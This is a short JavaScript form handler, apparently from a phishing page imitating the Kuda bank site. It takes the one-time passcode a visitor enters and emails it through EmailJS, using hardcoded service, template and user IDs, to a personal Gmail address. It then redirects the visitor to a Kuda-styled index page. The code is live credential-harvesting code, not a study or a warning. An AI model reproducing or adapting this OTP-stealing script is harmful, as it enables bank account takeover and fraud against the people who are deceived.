// emailjs.init("3yaulPAGa3CdjhurB");
const otp = document.querySelector("#otp");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_x5gwg5o";
const userId = "eEqrVXQc2RgDqp8sX";
const templateId = "template_mlcjolf";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "Mmaghaebube@gmail.com",
    otp: otp.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      otp.value = "";
      location.href = "/kuda.github.io/index.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
